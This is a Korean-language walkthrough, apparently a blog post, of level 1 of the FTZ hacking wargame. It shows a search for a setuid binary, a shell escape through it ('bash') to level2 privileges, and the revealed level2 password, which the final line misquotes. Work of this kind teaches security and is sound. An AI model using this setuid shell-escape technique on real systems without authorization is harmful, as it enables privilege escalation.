PW : `level1`

접속을 해 준 뒤 파일의 리스트를 보면 이와 같이 뜬다.
```bash
[level1@ftz level1]$ ls -al
total 88
drwxr-xr-x    4 root     level1       4096 Jan 16  2009 .
drwxr-xr-x   34 root     root         4096 Sep 10  2011 ..
-rw-------    1 root     root            1 Jan 15  2010 .bash_history
-rw-r--r--    1 root     root           24 Feb 24  2002 .bash_logout
-rw-rw-r--    1 root     root          224 Feb 24  2002 .bash_profile
-rw-r--r-x    1 root     root          151 Feb 24  2002 .bashrc
-rw-r--r--    1 root     root          400 Feb 24  2002 .cshrc
-rw-r--r--    1 root     root         4742 Feb 24  2002 .emacs
-rw-r--r--    1 root     root          162 Feb 24  2002 .epems
-r--r--r--    1 root     root          319 Feb 24  2002 .gtkrc
-rw-r--r--    1 root     root          100 Feb 24  2002 .gvimrc
-rw-r--r--    1 root     root           47 Apr  4  2000 hint
-rw-r--r--    1 root     root          226 Feb 24  2002 .muttrc
-rw-r--r--    1 root     root          367 Feb 24  2002 .profile
drwxr-xr-x    2 root     level1       4096 Dec  7  2003 public_html
drwxrwxr-x    2 root     level1       4096 May 20 11:59 tmp
-rw-r--r--    1 root     root            1 May  7  2002 .viminfo
-rw-r--r--    1 root     root         4145 Feb 24  2002 .vimrc
-rw-------    1 root     root          106 Mar  6  2000 .Xauthority
-rw-r--r--    1 root     root          245 Feb 24  2002 .Xdefaults
```

hint 파일이 있는데 한번 보면
```bash
[level1@ftz level1]$ cat hint


level2 권한에 setuid가 걸린 파일을 찾는다.
```

찾는 다라는 말이 있으니깐 `find`명령어가 떠오른다.  
자세한 사용법은 구글링을 통해 참고 했다.

`find [OPTION...] [PATH] [EXPRESSION]`

익스프레션으로 `-user ` <u>`uname`</u> 이라는 것이 있다(man find:499)

그래서 아래와 같이 명령어를 입력했다.
```bash
[level1@ftz level1]$ find / -user level2
find: /lost+found: Permission denied
find: /boot/lost+found: Permission denied
find: /proc/1/fd: Permission denied
find: /proc/2/fd: Permission denied
find: /proc/3/fd: Permission denied
find: /proc/4/fd: Permission denied
find: /proc/9/fd: Permission denied
find: /proc/5/fd: Permission denied

...
```

오류가 뜨므로 숨기기 위해서 우리들의 쓰레기 통으로 보낸다.
```bash
[level1@ftz level1]$ find / -user level2 2>/dev/null
/bin/ExecuteMe
```
그랬더니 깔끔하게 뜬다.

한번 ExecuteMe명령어를 실행해 보자.
```bash
[level1@ftz level1]$ ExecuteMe



                레벨2의 권한으로 당신이 원하는 명령어를
                한가지 실행시켜 드리겠습니다.
                (단, my-pass 와 chmod는 제외)

                어떤 명령을 실행시키겠습니까?


                [level2@ftz level2]$
```
보면 level2 권한에서 명령어를 실행하는 것을 볼 수 있다.

my-pass와 chmod를 쓰지 못한다고 했는데 그럼 어떤 명령어를 써야하는 것일까..?

level2유저 권한을 유지하면서 명령을 계속 할 수 있는 무언가가 필요한 것 같다.

```bash
[level1@ftz level1]$ ExecuteMe



                레벨2의 권한으로 당신이 원하는 명령어를
                한가지 실행시켜 드리겠습니다.
                (단, my-pass 와 chmod는 제외)

                어떤 명령을 실행시키겠습니까?


                [level2@ftz level2]$ bash


[level2@ftz level2]$ my-pass

Level2 Password is "hacker or cracker".
```
level2의 패스워드는 `hacker of cracker`이다.